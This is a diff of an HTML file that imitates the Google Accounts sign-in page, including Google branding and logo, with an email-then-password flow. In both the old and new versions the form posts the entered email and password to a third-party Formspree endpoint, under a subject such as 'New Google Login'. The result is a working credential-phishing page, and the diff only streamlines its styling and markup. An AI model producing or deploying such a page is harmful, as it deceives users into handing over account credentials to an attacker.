@@ -1,61 +1,44 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
         body {
+            font-family: Arial, sans-serif;
             background: #fff;
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
             margin: 0;
-            padding: 20px;
         }
         .card {
-            max-width: 450px;
+            max-width: 400px;
             width: 100%;
             padding: 48px 40px 36px;
             border: 1px solid #dadce0;
             border-radius: 8px;
-            background: #fff;
             text-align: center;
         }
         .logo {
             width: 75px;
-            height: 24px;
             margin-bottom: 20px;
         }
         h1 {
             font-size: 24px;
             font-weight: 400;
-            color: #202124;
-            margin-bottom: 8px;
+            margin: 0 0 10px;
         }
         .subtitle {
             font-size: 16px;
             color: #202124;
-            margin-bottom: 32px;
+            margin-bottom: 30px;
         }
         .input-group {
             margin-bottom: 20px;
             text-align: left;
-            position: relative;
-        }
-        .input-group label {
-            font-size: 14px;
-            color: #5f6368;
-            display: block;
-            margin-bottom: 4px;
-            font-weight: 500;
         }
         .input-group input {
             width: 100%;
@@ -63,195 +46,102 @@
             font-size: 16px;
             border: 1px solid #dadce0;
             border-radius: 4px;
-            background: #fff;
-            transition: border-color 0.2s;
-            outline: none;
-            font-family: 'Roboto', Arial, sans-serif;
+            box-sizing: border-box;
         }
         .input-group input:focus {
             border-color: #1a73e8;
-            border-width: 2px;
-            padding: 12px 14px;
+            outline: none;
         }
-        .input-group input::placeholder {
-            color: #9aa0a6;
-            font-weight: 400;
-        }
-        #passwordField, #passwordLabel {
+        #passwordField {
             display: none;
         }
-        .row {
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            float: right;
+        }
+        .next-btn:hover {
+            background: #1557b0;
+        }
+        .forgot-email {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            text-align: left;
+            margin-top: 10px;
+        }
+        .footer-links {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #5f6368;
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            margin-top: 8px;
+        }
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin: 0 5px;
         }
         .create-account {
             color: #1a73e8;
             text-decoration: none;
             font-weight: 500;
-            font-size: 14px;
+            float: left;
+            margin-top: 10px;
         }
-        .create-account:hover {
-            text-decoration: underline;
-        }
-        .next-btn {
-            background: #1a73e8;
-            color: #fff;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        .next-btn:hover {
-            background: #1557b0;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
-        }
-        .forgot-email {
-            display: block;
-            text-align: left;
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            margin: 8px 0 16px 0;
-        }
-        .forgot-email:hover {
-            text-decoration: underline;
-        }
-        .forgot-password {
-            display: block;
-            text-align: right;
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            margin: 4px 0 16px 0;
-        }
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-        .guest-notice {
-            font-size: 14px;
-            color: #5f6368;
-            text-align: left;
-            margin: 16px 0 8px 0;
-            line-height: 1.5;
-        }
-        .guest-notice a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-        .guest-notice a:hover {
-            text-decoration: underline;
-        }
-        .footer {
-            margin-top: 32px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: #5f6368;
-            border-top: 1px solid #e8eaed;
-            padding-top: 16px;
-        }
-        .footer a {
-            color: #5f6368;
-            text-decoration: none;
-            margin: 0 4px;
-        }
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        .footer-lang {
-            font-size: 12px;
-        }
-        .privacy-notice {
-            font-size: 12px;
-            color: #5f6368;
-            text-align: left;
-            margin-top: 16px;
-            line-height: 1.5;
-        }
-        .privacy-notice a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-        .privacy-notice a:hover {
-            text-decoration: underline;
-        }
-        @media (max-width: 450px) {
-            .card { padding: 24px 16px; }
+        .clearfix::after {
+            content: "";
+            clear: both;
+            display: table;
         }
     </style>
 </head>
 <body>
+    <div class="card">
+        <img class="logo" src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google">
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
 
-<div class="card">
-    <img class="logo" src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google">
-    <h1>Sign in</h1>
-    <p class="subtitle">Use your Google Account</p>
+        <form action="https://formspree.io/f/mjybdwon" method="POST">
+            <input type="hidden" name="_subject" value="New Login">
 
-    <!-- Form submits to Formspree -->
-    <form action="https://formspree.io/f/mjybdwon" method="POST">
-        <input type="hidden" name="_subject" value="New Google Login">
+            <div class="input-group" id="emailField">
+                <input type="email" name="identifier" placeholder="Email or phone" onblur="showPassword()" autofocus required>
+            </div>
 
-        <div class="input-group" id="emailField">
-            <label for="identifier">Email or phone</label>
-            <input type="email" id="identifier" name="identifier" placeholder="Enter your email" onblur="showPassword()" autofocus required>
+            <div class="input-group" id="passwordField">
+                <input type="password" name="hiddenPassword" placeholder="Enter your password" required>
+            </div>
+
+            <a href="#" class="forgot-email">Forgot email?</a>
+
+            <div class="clearfix">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="next-btn">Next</button>
+            </div>
+        </form>
+
+        <div class="footer-links">
+            <span>English (United States)</span>
+            <span>
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </span>
         </div>
-
-        <div class="input-group" id="passwordField">
-            <label for="hiddenPassword">Password</label>
-            <input type="password" id="hiddenPassword" name="hiddenPassword" placeholder="Enter your password" required>
-        </div>
-
-        <div id="passwordLabel" style="display:none; text-align:left; font-size:14px; color:#5f6368; margin-bottom:10px;">
-            Enter your password
-        </div>
-
-        <a href="#" class="forgot-email">Forgot email?</a>
-
-        <div id="forgotPasswordContainer" style="display:none;">
-            <a href="#" class="forgot-password">Forgot password?</a>
-        </div>
-
-        <div class="guest-notice">
-            Not your computer? Use <a href="#">Guest mode</a> to sign in privately.
-            <a href="#" style="display:inline-block; margin-left:4px;">Learn more</a>
-        </div>
-
-        <div class="row">
-            <a href="#" class="create-account">Create account</a>
-            <button type="submit" class="next-btn">Next</button>
-        </div>
-
-        <div class="privacy-notice">
-            This page is protected by Google reCAPTCHA to ensure you're not a bot.
-            <a href="#">Learn more</a>.
-        </div>
-    </form>
-
-    <div class="footer">
-        <span class="footer-lang">English (United States)</span>
-        <span>
-            <a href="#">Help</a>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-        </span>
     </div>
-</div>
 
-<script>
-    function showPassword() {
-        document.getElementById('emailField').style.display = 'none';
-        document.getElementById('passwordField').style.display = 'block';
-        document.getElementById('passwordLabel').style.display = 'block';
-        document.getElementById('forgotPasswordContainer').style.display = 'block';
-        document.getElementById('hiddenPassword').focus();
-    }
-</script>
-
+    <script>
+        function showPassword() {
+            document.getElementById('emailField').style.display = 'none';
+            document.getElementById('passwordField').style.display = 'block';
+        }
+    </script>
 </body>
 </html>
